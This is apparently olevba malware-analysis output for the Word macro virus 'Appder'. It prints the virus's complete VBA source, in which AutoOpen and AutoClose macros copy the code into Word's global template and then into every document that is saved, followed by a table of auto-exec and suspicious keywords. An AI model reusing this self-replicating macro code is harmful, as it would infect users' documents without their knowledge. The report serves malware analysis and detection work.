olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Appder-155f0537518e18909d054c7c83f987b022e9a0ce
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Appder-155f0537518e18909d054c7c83f987b022e9a0ce - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Appder-155f0537518e18909d054c7c83f987b022e9a0ce - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim AClose
Dim Ad
Dim sMe$
Dim sMacro$
On Error GoTo -1: On Error GoTo Quit
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "         " Then
        AClose = -1
    End If
    If WordBasic.[MacroName$](i, 0, 0) = "Appder" Then
        Ad = -1
    End If
Next i
If Not AClose And Not Ad Then
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":Appder"
    WordBasic.MacroCopy sMacro$, "Global:Appder"
    sMacro$ = sMe$ + ":AutoClose"
    WordBasic.MacroCopy sMacro$, "Global:AutoClose"
End If
Quit:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Appder.bas 
in file: Virus.MSWord.Appder-155f0537518e18909d054c7c83f987b022e9a0ce - OLE stream: 'Macros/VBA/Appder'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim AClose
Dim Ad
Dim sMe$
Dim sMacro$
On Error GoTo -1: On Error GoTo Quit
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "         " Then
        AClose = -1
    End If
    If WordBasic.[MacroName$](i, 0, 0) = "Appder" Then
        Ad = -1
    End If
Next i
If Not AClose And Not Ad Then
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":Appder"
    WordBasic.MacroCopy sMacro$, "Global:Appder"
    sMacro$ = sMe$ + ":AutoClose"
    WordBasic.MacroCopy sMacro$, "Global:AutoClose"
End If
Quit:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Appder-155f0537518e18909d054c7c83f987b022e9a0ce - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub MAIN()
Dim sMe$
Dim sTMacro$
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Quit
WordBasic.CurValues.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:Appder", sTMacro$
sTMacro$ = sMe$ + ":Appder"
WordBasic.MacroCopy "Global:Appder", sTMacro$
sTMacro$ = sMe$ + ":AutoClose"
WordBasic.MacroCopy "Global:AutoClose", sTMacro$
WordBasic.FileSaveAs dlg
GoTo Done
Quit:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

